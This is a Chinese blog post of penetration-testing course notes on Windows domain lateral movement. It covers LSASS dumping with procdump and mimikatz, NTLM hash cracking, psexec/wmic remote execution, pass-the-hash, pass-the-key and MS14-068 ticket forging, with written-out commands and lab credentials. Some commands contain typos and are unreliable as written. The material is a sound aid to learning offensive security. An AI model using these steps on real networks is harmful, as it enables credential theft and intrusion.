# XD安全渗透测试课程 学习笔记 | 内网渗透(二)

原创 耳鼠 [0x00实验室](javascript:void(0);) *2021-08-11 08:08*

收录于合集#小迪安全笔记20个

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9wW2QG2oK5uzovZSDDzOZ4mZkpxga7sltpaic3NkuD23x17CTTtGo1icuxK2BjH7wqorDRdhYjjWvg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  本文来源于团队成员耳鼠的学习笔记，仅供学习参考。有谬误之处，还望多多谅解，这是一系列文章，定期更新该课程学习笔记。



------

往期内容：

day58-64笔记：

[XD安全渗透测试课程 学习笔记 |  提权阶段](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247483877&idx=2&sn=35f4bdce1d4043219dbbb67420bb5818&chksm=cfd87e1af8aff70c74e6a5541d7b120548ac3242a320083a81f4b0ae3971d60b2903e7245705&scene=21#wechat_redirect)



day65-66笔记：

[XD安全渗透测试 学习笔记 |  内网渗透(一)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484046&idx=1&sn=85b730dafd28d0e798b8c70fe8130582&chksm=cfd87d71f8aff4672c1c0d254342b6e63f026b825be225e8af7fa30f364cf49bbdb384b42b0f&scene=21#wechat_redirect)



------

**day67.域横向 smb&wmi 明文或 hash 传递**

知识点1:

Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码

Windows2012以下版本如安装KB2871997补丁,也会导致无法获取明文密码



针对以上情况,我们提供了4种方式解决此类问题

- 1.利用哈希hash传递(pth,ptk等)进行移动
- 2.利用其他服务协议(SMB,WMI等)进行哈希移动
- 3.利用注册表操作开启Wdigest Auth值进行获取
- 4.利用工具或第三方平台(Hachcat)进行破解获取



知识点2:

  Windows系统LM HASH及NTLM Hash加密算法,个人系统在Windows vista后,服务器系统在Windows 2003以后,认证方式均为NTLM Hash。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUoyzvb8d9pHyRMcOmibTBmWXEMYJahJ726Zrw780e43FVH515UJ3dvPg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



演示案例:

案例1-Procdump+Mimikatz配合获取

  procdump是Windows官方的工具

如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法

运行procdump在当前目录下生成lsass.dmp文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUicoaaESTTrkL7wic1rKjk73YnXH2BG5w733TNJmtN0zsHQqatcnj1IYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后再在mimi上使用命令还原出来密码

在目标主机上用proc生成文件,然后再在本地上用Mim还原出密码



mimikatz上执行:

- 
- 

```
sekurlas::minidump lsass.dmpsekurlas::logonPasswords full
```



Hashcat破解获取Windows NTML Hash

- 

```
hashcat -a 0 -m 1000 file --force
```



案例2-域横向移动SMB服务利用-psexec,smbexec(官方自带)

利用SMB服务可以通过明文或hash传递来远程执行,条件445服务端口开放。



\#psexec第一种:先有ipc链接,psexec需要明文或hash传递

- 
- 

```
net use \\192.168.3.32\ipc$ "admin!@#45" /user:administratorpsexec \\102.168.3.32 -s cmd #需要先有ipc链接 -s以system权限运行
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUWDxXOVGJ3cZ05gyVIibXEDBlLkTYtgOvkiaRDYicf3eJUPJbzkemaVgAQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



\#psexec第二种:不用建立IPC直接提供明文账户密码

  官方Pstools无法采用hash连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUn8xiaVQxF5O9deZvkLqseFlF0eJVxqQWibsVR5n1NLClUr56WxxFKpHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在官网下载pstools,上传至目标主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUwxtibf7bhib2Nx3yoPI9IP8jibQoicOzcrK8icCdcbUya16d67VOic5xRyeQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



  执行命令,将前期信息收集到的ip地址,用户名 ,密码,反弹回cmd

基于Hash的:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU4jAhY4wq4aM4UMZOxN6uko9sSW7cJRzzpZQqvoNnwehEXoSl2TYLGA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



出现了问题，解决需要用到一个非官方的库impacket

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUIUCQucRUyx8vI3Kh3giaYib2nWIatr8lhygSaiaTpicnLYV0gOqIFRPuuw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  反弹成功



\#smbexec无需先ipc链接 明文或哈市传递

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU3vnQJ7I0XPz3WnZ6K8rsddz85SQAWibic74paRsYvO9wQGkpnKoicY8RA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUxCALCecdH2jCOroiaA0smtPYUjuzQVKj1EKESCFsafqUnKynysa4d0A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUYFl9dSdojBHLCTIkuB3wJLE3mickFlTVPXyErTHyhTHPswOibwMMYoGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



域横向移动WMI服务利用-cscript,wmiexec,wmic

  

​    WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹

\#自带WMIC 明文传递 无回显(缺点,功能比较尴尬)

- 

```
wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create"cmd.exe /c ipconfig >C:\1.txt
```

原本是没有1.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUiaf2rKZIaxOticLy1qJ6E4gszUjOmiaicxsGwrAzYktBE4SNRub6b7Wyng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在目标主机上执行命令,等待连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdULIEA0eFFuFeVFWOvA1QrByNeViazfRGFXJO9LZb5tNAShIIHNJyxmrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



连接完毕后,在目标主机上连接的那个域主机上出现了1.txt



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUEI9nHsuMl0Pdad2yYeO8E4N63S1Sjhzx7zakbwWkIaV2jRfoNZwn2g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUZTxGPpGP8mW0eiaclgM1QNp0l8vcc6xicOW4ga3dHzKeM0J81Doo0VFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

需要借助一个wmiexec.vbs文件,在资源中有

执行命令,反弹cmd

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUibLS9h0Sgp3r1vIRmVQibNAGQWe6f42ahWDgjPZTrlCWsIOlpYrFLnPg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUJfsdBjZyFSM2oCtpX8yvjMJ53PLfkKGsnNEnX8AA4utnaL6YictGHPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdULZ76MuPT7UNoF8XLib6viblLWG9g2qNDqtSkU40x1yIJeMicWr16TzMiaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU7gOkU2SXu9mzDexSNVtHCl9Dxax9zHz0ibxmJUtxibsKDb2EdbyEw9kg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



案例4-域横向移动以上服务bash批量利用-python编译exe



------

**day68.域横向 PTH&PTK&PTT 哈希票据传递**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUmCFSLfFCrUr5ZJIP8E9KCuZ1icbf8P2ialOt9YvEPDVt3W2I98LyN6jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Kerberos协议具体工作方法,在域种,简要介绍一下:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUQiaeyYcylFJL1HpCykTb7SiaGRnJsVxaqmPeT9acQDnb0iclJZKkU83CA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```
PTH(pass the hash) #利用lm或ntlm的值进行的渗透测试PTT(pass the ticket)#利用的票据凭证TGT进行的渗透测试PTK(pass the key)#利用的ekeys aes256进行的渗透测试#PTH在内网渗透种是一种很经典的攻击方式,原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务,而不用提供明文密码。如果禁用lentlm认证,PsExec无法利用获得的ntml hash进行远程连接,但是使用mimikatz还是可以攻击成功。对于8.1/2012r2,安装补丁kb2871997的win7/2008r/8/2012等,可以利用AES keys代替NT 哈市来实现ptk攻击总结:KB2871997补丁后的影响pth:没打补丁用户都可以连接,打了补丁只能administrator连接ptk:打了补丁才能用户都可以连接,采用aws256连接https://www.freebuf.com/column/220740.html#PTT攻击的部分就不是简单的NTLM认证了,它是利用Kerberos协议进行攻击的,这里就介绍三种常⻅的攻击方法:MS-068.Golden ticket,SILVER ticket,简单来说就是将连接合法的票据注入到内存中实现连接。MS14-068基于漏洞,Golden ticket(⻩金票据),SILVER ticket(白银票据)其中Golden ticket(⻩金票据),SILVER ticket(白银票据)属于权限维持技术MS14-068造成的危害是允许域内任何一个普通用户,将自己提升至域管理权限。微软给出的补丁是kb3011780
```





*演示案例:*

域横向移动PTH传递-Mimikatz

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUpm7yPcgpXico6sceIsibG7Dc2EwNMeSMBpMhTT4uMictfVmiayrrf1icZyw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

严谨一点,LM和NTML最好都收集

下面这个命令是获取aes256加密的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUCvy3ia6Aw4Sia0m1jwfKYUsD9rOUN89kukMBWto46dP5ue5xrIxJDqQQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUpj4BAssl3ob57Hp7yCMEgJnRwiaDvWia3MtGDsVuZwPsJBBenwCNrXMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

PTH ntlm床底

未打补丁得到工作组及域连接:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUtVdrKTDqWBax5DWnjdbia1xxRHVWzRFW442hNhx08neS15RSSI5RRIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



攻击当前域控主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUmXmnBPh5YUO0a8JGpvoNzibJH5DYDFtInySUo7HDDCaCHHfd3uibpn2A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

直接连接域控主机是无法连接的

使用mimikatz进行攻击

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUZKibPLpsJ5apicR0Bwc8ITfK5x4fvjiaKhp94VIgEwd6QVhdcaricKcgnQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

攻击命令上并没有指定IP地址,这是一种随机攻击,IP地址是前期信息收集的,连接时,可以遍历IP地址,

看那个有回显

攻击成功反弹回来了一个cmd

在这个cmd中进行连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU310tWNddYtRshDlBEibH3spPgbyicT2SODjl69yeOPyQE7MufKFc5xjQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



如果IP地址不识别,就换成计算机名

之后就和at schtasks一样了,复制文件,执行文件等

攻击另外一台主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUS31UopQZWJ4corwXiaQKtDZsSFSib8uCKnPotcPI64F4ibJrnPsd7ehoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里domain是一个工作组,直接连接到了主机的本地的Administered



案例2-域横向移动PTK传递-mimikatz

PTK aes256传递

打补丁后的工作组及域连接:

sekurlsa::ekeys #获取aes

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUPLAWianZyKjMUMCyGrRoAl1J02Dg3ppQ28jo0UrqzfroUw5pBYBayOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdURBt8SffmyOWpjWFHTQXCXict13aWdSmHJe96zLVWIRRTUCBvRnJjzxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUib25UXaURCnKwrsOIHxlqaruYa9RTuckrMZvjbQiaGdCML7oIKKibnk6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



弹出一个cmd窗口,尝试连接域内主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUqBldzmrUfymXIak4araMaibiaYkKVLSMO8oTmiaeXza2TyhLp9o35DR6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



域横向移动PTT传递-MS14068&kekeo&local

第一种利用漏洞:

能实现普通用户直接获取域控system权限

\#ms14-068 powershell执行

  1.查看当前sid whoami/user

  2.mimikatz #kerberos::purge

//清空当前机器中所有凭证,如果有域成员凭证会影响凭证伪造

mimikatz# kerberos::list //查看当前机器凭证

mimikatz# kerberos::ptc 票据文件 //将票据注入到内存中

  3.利用ms14-068生成TGT数据

ms14-058.exe 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUCpWibyvdcibvxGsbcfic0bxMGm7rEwOASMkVOQ2V77wssWia2EqsOfhE7Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

4.票据注入内存

mimikatz.exe "kerberos::ptc TGT_mary@god.org.ccache" exit

5.查看凭证列表 klist

6.利用 dir \\192.168.3.21\C$



域内目标机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUIpnuicnEiarWopZZxR4HIQceKQ2iaGkSeH7q8H8lQ2WDsKzQLXwFx1Myw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU2c1Xtomh1zTWcSiaT1zsdQrkbXx09SrtXoLjPd22HF2ibO3gHLW9nZibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在域内主机mary上执行

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUDicdtob1yE4b18Bnb3b46CyB2oGxicu76LqxiaEZFy1zjcnnlibgrF216A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



生成TGT_mary@god.org.ccache

查看mary内与那些主机有链接产生的票据



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUnDpF8ickJK0UpAsVCl01nqFiaSEHyjyPQJhA8SqTn8ic6jATgCHJNMLJw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUUCTN8MJ6L8JEbjRFwuQ3vXeCSuOVhOeKmT77OHBn62d6CCbOJmUCAA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

为了防止影响我们的操作,删除已有的票据

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUuREEp76ut825k08QDjcwOfBJm7wW4hiaEKiaWFUp2Thb0JBFWQtfMTxQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

用mimi导入票据到内存,并且查看是否导入成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUyibgUBQ6H95czOB3oSJo7ouHjBlTLHWkSz3IOmibNxatVDMQTkAyZJ7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU1UianicAleXol8DHXzgRWmNX9ibD8IyvN32GHLn5d5OQXjQRLXOPxvtug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



连接域控主机



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUvVfK6wbHGJTIIjhicLgwcxYyFToSaoQyTJWjg2LSrpIiccDfvHDulUMQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



用IP地址连接错误,用用户名

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdU9k7iclgV1nmQemfuT8J6bDQibEcJ56Eu8PMRGNzI6EjKgq399yvo6GvA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第二种利用工具kekeo

1.生成票据

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUA0ia9CtR403fuDAibqZgE5tCJxEAGsxEX4g0YnBBeYnic4YOR2Du1ZxmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



2.票据导入

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUQjSz1TICYSOxnptoRydLa0q3h0S8ZVAibOJcbLctJCcmRcN4gIMkfhQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



3.查看凭证 klist

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUEuol9hib6SF9o6zpW1cWwhe612nQ98B4Vwh9kjJpOZTBdKwtwnyWDpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

执行完命令生成票据

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUWQasPtDAM701OG7LYtr4WWWjG1huekmdgMBnicqrdftAaibgQTOk7gvQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



将当前内存中的票据清空

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUDSZFuTlzticTQx4ib2rSicmEmVMuIniaO6xMgVmok16KsubEPBxv4QLfMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



导入票据,查看导入成功否?

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUhrlwVt5TVB0ic61HVarfluruVPpQw9iahiamug4ufqDNy8XHWBlHzMDQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



再进行连接

第三种利用本地票据(需要管理员权限)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUEoImvYghrVqxCkt5sHQPyaZUtnMAhsr0UesNU0bjqDoLGRmnG0KDqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



导出票据后,会导出到你当前执行目录,收集好票据

缺陷:ptt只能保持10个小时,如果能拿到10个小时内的凭据,可以成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUibbA8VDvA89M4PPVh8xtaViaFzdkno6xVT6pUuTALerVQSib45lPl9B6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUyN5RNBXaY42ZYljxePGfdA1atLXMN9Pibc76CibbU2r2pIbJPYKCrKMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

导入成功



**案例4-国产Ladon内网杀器测试**

信息收集-协议扫描-

我们打开Ladon的gui版本

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUfNtPAxmfvEAibBibQ69CuSudTwWX2HDRB7plhrBrLoJaRvACGoRD2DQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

扫描时,选择的时OnlinePC(存活主机),会尝试获取存活主机

用命令行形式执行扫描存活主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicum920YfaOvlF4gruwmGdUbQG8bK7ibCFooJfdXicHk7Uks6O3gF5znfXibu4LNeibpQMKJjEO7Gvneg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



------

  本系列定期更新，麻烦点个关注吧。